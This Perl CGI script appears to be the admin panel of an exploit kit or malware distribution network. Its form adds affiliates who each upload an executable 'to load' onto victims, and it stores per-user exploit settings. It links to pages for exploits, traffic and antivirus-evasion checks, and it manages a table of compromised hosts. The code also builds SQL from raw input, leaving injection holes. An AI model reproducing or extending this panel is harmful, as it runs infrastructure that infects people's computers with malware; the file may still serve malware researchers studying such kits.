#!/usr/bin/perl
  
  # xplindex.pl
  use CGI;
  use CGI::Carp qw/fatalsToBrowser warningsToBrowser/;
  use CGI::Session ( '-ip_match' );
  use File::Basename;
  use DBI;
  require "xpl/config.pl";
  
  $session = CGI::Session->load();
  $q = new CGI;
  
  $cook = $q->param('cook');
  $username = $q->param('username');
  $affid = $q->param('affid');
  $affid2 = $q->param('affid2');
  $email = $q->param('email');
  $password = $q->param('password');
  $cook2 = $q->param('cook2');
  $clear_db = $q->param('clear_db');
  $filename = $q->param("exetoload");
  $vfy = $q->param('vfy');
  $optimizedb = $q->param('optimize');

  $db_name = 'DBI:mysql:' . $config{MysqlDB};
  $dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";

  #limit file upload to 5mb
  $CGI::POST_MAX = 1024 * 5000;
  
  #limit filename
  my $safe_filename_characters = "a-zA-Z0-9_.-";
  
  #upload directory
  my $upload_dir = 'xpl/dep/';
  
  if($vfy ne 'xplad')
  {
    print "Status: 301 Moved\nLocation: login.pl\n\n";
  }  
  if($session->is_expired)
  {
      print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
      print "Your has session expired. Please login again.";
      print "<br/><a href='login.pl>Login</a>";
  }
  elsif($session->is_empty)
  {
      #print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
      print "Status: 301 Moved\nLocation: login.pl\n\n";
  }
  else
  {
        if($filename ne "")
	{
        my ( $name, $path, $extension ) = fileparse ( $filename, '\..*' );  
        $filename = $name . $extension;  
        $filename =~ tr/ /_/;  
        $filename =~ s/[^$safe_filename_characters]//g;  
 
        if ( $filename =~ /^([$safe_filename_characters]+)$/ )  
        {  
          $sortthtyy = $1;
          if($filename =~ m/.exe$/g)
          {
            $filename = $sortthtyy;  
	    $safefile2 = '1';
          }
          else
          {  
            $stringindexall = '<b>File ext not supported !</b>' . "\n";
          }
        }  
        else  
        {  
          $stringindexall = '<b>Filename contains invalid characters !</b>' . "\n";
        }
	}
	  #Create User
      if($username ne "" and $affid2 ne "" and $email ne "" and $password ne "" and $cook2 ne "" and $filename ne "" and $safefile2 eq '1')
	  {
		#upload file
		my $upload_filehandle = $q->upload("exetoload");  
        open ( UPLOADFILE, ">$upload_dir/$filename" ) or die "$!";  
        binmode UPLOADFILE;  
        while ( <$upload_filehandle> )
        {  
          print UPLOADFILE;  
        }  
        close UPLOADFILE;
		
		#Insert new username into DB
                $cryptpwd = substr(crypt($password,substr($password,0,2)),2);
		$sql = "INSERT affiliates (username, password, affid, email, cook, filez, city, blankcheck, windowsonly, antivp) VALUES ('$username', '$cryptpwd', '$affid2', '$email', '$cook2', '$filename', 'ALL', 'no', 'no', 'no')";
		$statement = $dbh->prepare($sql);
		$statement->execute() or $doubleip = 1;

                #Insert options into DB for the user
		$sql = "INSERT options (username, mode, submode, check_crash, time_bxpl, keyz, percent_rand, showxpl, exploits_enabled) VALUES ('$username', 'aggr', 'shared', 'no', '2', '', '20', '2', '')";
		$statement = $dbh->prepare($sql);
		$statement->execute() or $doubleip = 1;
		
		print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
		$stringindexall = '<b>The User have been added !</b>' . "\n";
		indexalltab($stringindexall);
	  }
	  else
	  {
	    if($clear_db eq 'yes')
		{
		  #Clear all database
		  $sql = "TRUNCATE TABLE hosts";
		  $statement = $dbh->prepare($sql);
		  $statement->execute();
		  $stringindexall = '<b>The DB have been cleared !</b>' . "\n";
		}
           if($optimizedb eq 'yes')
           {
	     $sql = "OPTIMIZE TABLE hosts,options,exploits_enabled,exploits,affiliates";
	     $statement = $dbh->prepare($sql);
	     $statement->execute();
             $stringindexall = '<b>All DB have been optimized !</b>' . "\n";
           }
		$randomcook = generate_random_string(20);
		$randomaffid = generate_random_string(10);
		print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
	    indexalltab($stringindexall);
	  }
  }
  
sub indexalltab
{
 $stringadd = shift;
 print <<THEHTMLINDEX;
 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<HTML xmlns="http://www.w3.org/1999/xhtml" lang="fr"><HEAD><META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">

<TITLE>$config{NetName} - Admin Panel</TITLE>
    <LINK rel="stylesheet" type="text/css" href="style/style3.css" media="all">
    
</HEAD><BODY>

<DIV id="top_nav">
	<DIV class="content">
	<center>
    
        <UL>
            <LI><A href="xplindex.pl?cook=$cook&vfy=xplad" title="Home" class="Home">Home</A></LI>
            <LI><A href="xplstats.pl?cook=$cook&vfy=xplad" title="Reports">Reports</A></LI>
            <LI><A href="xplprograms.pl?cook=$cook&selectuser=Admin&vfy=xplad" title="Accounts">Accounts</A></LI>
	    <LI><A href="xploptions.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="Exploits Options">Exploits</A></LI>
	    <LI><A href="xpltraffic.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="Traffic Options">Traffic</A></LI>
            <LI><A href="xplavs.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="AVs Check">AV Check</A></LI>
            <LI><A href="login.pl?action=logout" title="Log Out">Log Out</A></LI>
        </UL>
    </center>    
    </DIV>
</DIV>
<center>
<br>
<b>
</b>
<h2>[ Home ]</h2>
<br>
<DIV id="main">
<DIV class="content">
<DIV id="pages">
<DIV id="home">
<DIV>
</DIV>
<center>Welcome to the Admin Panel of $config{NetName}.</center><br><br>
<h3>Add User</h3>

$stringadd
<br><br>

<form method="post" enctype="multipart/form-data">
Username: <input type="text" name="username"><br>
Password: <input type="password" name="password"><br>
Email: <input type="text" name="email"><br>
Exe to load: <input type="file" name="exetoload" /><br>
<input type="hidden" name="affid2" value="$randomaffid">
<input type="hidden" name="cook2" value="$randomcook">
<input type="hidden" name="cook" value="$cook">
<input type="hidden" name="vfy" value="xplad">
<input type="submit" value="Add user">
</form>
<br><br>
<a href="xplindex.pl?clear_db=yes&vfy=xplad">Reset All stats</a><br><br>
<a href="xplindex.pl?optimize=yes&vfy=xplad">Optimize Database</a>
<br><br>
</DIV>
</DIV>
</DIV>
</DIV>
<br><br>
</center>

<DIV id="footer">
	<DIV class="content">
        <DIV class="copyright">
        	<P><BR>
        </DIV>        
    </DIV>
</DIV>

</body>
</html>
 
 
THEHTMLINDEX
}

sub generate_random_string
{
	my $length_of_randomstring=shift;

	my @chars=('0'..'9');
	my $random_string;
	foreach (1..$length_of_randomstring) 
	{
		$random_string.=$chars[rand @chars];
	}
	return $random_string;
}

1;
